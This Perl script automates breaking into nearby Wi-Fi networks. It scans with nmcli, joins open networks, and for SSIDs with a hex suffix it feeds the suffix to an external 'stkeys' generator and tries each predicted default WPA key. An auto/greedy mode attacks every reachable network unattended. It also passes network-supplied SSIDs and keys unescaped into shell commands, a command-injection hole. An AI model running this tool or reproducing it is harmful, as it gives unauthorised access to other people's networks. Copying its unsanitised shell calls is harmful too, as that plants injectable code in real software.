#!/usr/bin/perl

use strict;
use warnings;

use Getopt::Long;

my $auto = 0;
my $greedy = 0;
GetOptions(
    'h|help' => \&help,
    'a|auto' => \$auto,
    'g|greedy' => \$greedy);

my $stkeys = 'build/stkeys';
if (!-e $stkeys) {
    $stkeys .= '.exe';
    if (!-e $stkeys) {
        $stkeys = `which stkeys`;
        chomp $stkeys;
        if (!-e $stkeys) {
            die 'unable to find stkeys, run make first';
        }
    }
}

my $nm = `which nmcli`;
chomp $nm;
if (!-e $nm) {
    die 'could not find nmcli';
}

my $applet_running = !system 'killall nm-applet';
@SIG{'INT', 'TERM', 'SEGV'} = \&quit;

my $done = 0;
my %blacklist;
while (!$done) {
    my @networks = sort_networks(query_nm('dev wifi',
        'SSID', 'BSSID', 'RATE', 'SIGNAL', 'SECURITY', 'ACTIVE'));
    if ($auto) {
        $done = 1;
        for my $network (@networks) {
            my $last = $network == $networks[$#networks];
            my $ssid = $network->{SSID};
            my $bssid = $network->{BSSID};
            my $security = $network->{SECURITY};
            if (!$blacklist{$bssid}
                && ($security eq '' || defined ssid_code($ssid))) {
                if (force_connect_network($network, 0)) {
                    $done = !$greedy || $last;
                } else {
                    $done = $last;
                }
                $blacklist{$bssid} = 1;
                last;
            }
        }
    } else {
        my $i = 0;
        for my $network (@networks) {
            my $active = $network->{ACTIVE} eq 'yes' ? 'active' : '';
            print "$i $network->{SSID}: $network->{RATE} $network->{SIGNAL}"
                . " [$network->{SECURITY}] $network->{ACTIVE}\n";
            $i++;
        }
        my $target = get("network");
        if ($target < @networks) {
            $done = force_connect_network($networks[$target], 1);
            if ($greedy) {
                $done = 0;
            }
        }
    }
}

quit();

sub quit {
    if ($applet_running) {
        system 'nm-applet &>/dev/null &';
    }
    exit;
}

sub help {
    print "usage: $0 [--auto] [--greedy]\n";
    exit;
}

sub get {
    my($msg) = @_;
    print $msg . '> ';
    my $result = <>;
    chomp $result;
    return $result;
}

sub ssid_code {
    my($ssid) = @_;
    if ($ssid =~ /([0-9A-F]{6,})$/) {
        return $1;
    }
    return undef;
}

sub force_connect_network {
    my($network, $manual) = @_;
    my $ssid = $network->{SSID};
    my $bssid = $network->{BSSID};
    my $security = $network->{SECURITY};
    print "trying to connect to $ssid ($bssid)\n";
    if ($security eq '') {
        if (test_nm("dev wifi connect '$ssid'") == 0) {
            print "$ssid is unprotected\n";
            return 1;
        }
        return 0;
    }
    my $code = ssid_code($ssid);
    if (!defined $code) {
        if ($manual) {
            my $password = get("password");
            if ($password ne '' && test_nm("dev wifi connect $bssid password $password") == 0) {
                print "$ssid has key $password\n";
                return 1;
            }
            print "invalid key\n";
        } else {
            print "no hash substring found in the SSID\n";
        }
        return 0;
    }
    print "generating keys...\n";
    my @keys = split "\n", `$stkeys $code`;
    for my $key (@keys) {
        print "trying $key...\n";
        if (test_nm("dev wifi connect $bssid password $key") == 0) {
            print "$ssid has key $key\n";
            return 1;
        }
    }
    return 0;
}

sub test_nm {
    my($query) = @_;
    return system "$nm $query";
}

sub sort_networks {
    my(@networks) = @_;
    return sort {$b->{SIGNAL} <=> $a->{SIGNAL} || $a->{SSID} cmp $b->{SSID}} @networks;
}

sub query_nm {
    my($query, @fields) = @_;
    my $fields = join ',', @fields;
    my @results = split "\n", `$nm -t -f $fields $query`;
    my @processed_results;
    for my $result(@results) {
        my @data;
        my $quoted = 0;
        my $escaped = 0;
        my $current = '';
        my $extra = 0;
        my $length = length $result;
        for my $i (0 .. (length $result) - 1) {
            $extra++;
            my $char = substr $result, $i, 1;
            my $normal = 0;
            if (!$escaped) {
                if ($char eq "'") {
                    $quoted = !$quoted;
                } elsif ($char eq '\\') {
                    $escaped = 1;
                } elsif ($char eq ':') {
                    if ($escaped) {
                        $normal = 1;
                    } else {
                        push @data, $current;
                        $current = '';
                        $extra = 0;
                    }
                } else {
                    $normal = 1;
                }
            } else {
                $normal = 1;
            }
            if ($normal) {
                $current .= $char;
            }
            if ($char ne '\\' && $escaped) {
                $escaped = 0;
            }
        }
        if ($extra) {
            push @data, $current;
        }
        my %zip;
        @zip{@fields} = @data;
        push @processed_results, \%zip;
    }
    return @processed_results;
}